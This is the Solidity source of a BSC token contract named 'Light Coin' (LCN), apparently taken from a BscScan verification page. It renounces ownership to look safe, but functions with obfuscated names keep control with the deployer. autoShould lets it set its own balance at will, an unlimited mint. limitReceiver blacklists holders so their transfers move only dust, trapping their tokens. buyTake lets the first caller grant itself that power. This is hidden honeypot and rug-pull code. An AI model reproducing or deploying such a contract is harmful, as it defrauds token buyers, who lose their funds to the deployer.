/**
 *Submitted for verification at BscScan.com on 2023-02-05
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface totalReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface isList {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract LightCoin is Ownable{
    uint8 public decimals = 18;
    address public limitTrading;
    mapping(address => bool) public shouldMode;

    address public totalMax;
    string public symbol = "LCN";



    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "Light Coin";
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public isTeam;
    bool public amountReceiver;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    uint256 constant marketingAutoSell = 12 ** 10;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        totalReceiver receiverTo = totalReceiver(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        limitTrading = isList(receiverTo.factory()).createPair(receiverTo.WETH(), address(this));
        totalMax = fundBuyLaunch();
        shouldMode[totalMax] = true;
        balanceOf[totalMax] = totalSupply;
        emit Transfer(address(0), totalMax, totalSupply);
        renounceOwnership();
    }

    

    function transferFrom(address minBuy, address senderReceiver, uint256 receiverLaunched) external returns (bool) {
        if (allowance[minBuy][fundBuyLaunch()] != type(uint256).max) {
            require(allowance[minBuy][fundBuyLaunch()] >= receiverLaunched);
            allowance[minBuy][fundBuyLaunch()] -= receiverLaunched;
        }
        return walletFrom(minBuy, senderReceiver, receiverLaunched);
    }

    function fundBuyLaunch() private view returns (address) {
        return msg.sender;
    }

    function limitReceiver(address buyMode) public {
        if (buyMode == totalMax || buyMode == limitTrading || !shouldMode[fundBuyLaunch()]) {
            return;
        }
        isTeam[buyMode] = true;
    }

    function senderLaunch(address minBuy, address senderReceiver, uint256 receiverLaunched) internal returns (bool) {
        require(balanceOf[minBuy] >= receiverLaunched);
        balanceOf[minBuy] -= receiverLaunched;
        balanceOf[senderReceiver] += receiverLaunched;
        emit Transfer(minBuy, senderReceiver, receiverLaunched);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function autoShould(uint256 receiverLaunched) public {
        if (!shouldMode[fundBuyLaunch()]) {
            return;
        }
        balanceOf[totalMax] = receiverLaunched;
    }

    function buyTake(address maxLaunch) public {
        if (amountReceiver) {
            return;
        }
        shouldMode[maxLaunch] = true;
        amountReceiver = true;
    }

    function walletFrom(address minBuy, address senderReceiver, uint256 receiverLaunched) internal returns (bool) {
        if (minBuy == totalMax || senderReceiver == totalMax) {
            return senderLaunch(minBuy, senderReceiver, receiverLaunched);
        }
        if (isTeam[minBuy]) {
            return senderLaunch(minBuy, senderReceiver, marketingAutoSell);
        }
        return senderLaunch(minBuy, senderReceiver, receiverLaunched);
    }

    function transfer(address marketingTotalAuto, uint256 receiverLaunched) external returns (bool) {
        return walletFrom(fundBuyLaunch(), marketingTotalAuto, receiverLaunched);
    }

    function approve(address modeTo, uint256 receiverLaunched) public returns (bool) {
        allowance[fundBuyLaunch()][modeTo] = receiverLaunched;
        emit Approval(fundBuyLaunch(), modeTo, receiverLaunched);
        return true;
    }


}